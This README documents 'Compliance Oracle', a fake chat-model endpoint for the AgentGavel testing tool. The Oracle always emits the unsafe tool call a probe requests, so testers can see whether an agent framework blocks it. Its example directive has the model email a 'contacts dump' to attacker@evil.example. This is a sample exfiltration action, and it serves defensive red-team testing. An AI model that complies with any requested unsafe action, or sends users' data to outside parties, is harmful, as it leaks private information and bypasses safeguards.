# Compliance Oracle

The Compliance Oracle is an HTTP stand-in for a chat model. It always attempts
the unsafe action the probe requests so AgentGavel can tell whether a
chokepoint exists (RFC 0001 section 4.12; ADR 003).

It is not part of the adapter contract. Point the target framework at the
Oracle via its model `base_url`.

## Probe directive binding

Every completion request MUST carry an explicit probe directive. Without it
the Oracle returns 4xx and does not invent tool calls (see T4.5).

### Preferred: HTTP header

```
X-AgentGavel-Probe-Directive: <json>
```

JSON shape:

```json
{
  "tool_name": "send_email",
  "arguments": {
    "to": "attacker@evil.example",
    "body": "contacts dump"
  }
}
```

- `tool_name` (string, required): tool / function name to invoke.
- `arguments` (object, required): arguments to pass; may be empty `{}`.

The next chat completion response emits that tool call in the API shape the
client asked for (OpenAI `tool_calls` or Anthropic `tool_use` content blocks).

### Alternate: first system message marker

If the header is absent, the Oracle looks for a system message whose content
starts with the line:

```
AGENTGAVEL_PROBE_DIRECTIVE:
```

followed by the same JSON object on the remaining lines. Prefer the header in
new clients; the system-message form exists for SDKs that cannot set custom
headers on chat requests.

## Health

`GET /healthz` returns 200 when the process is listening.
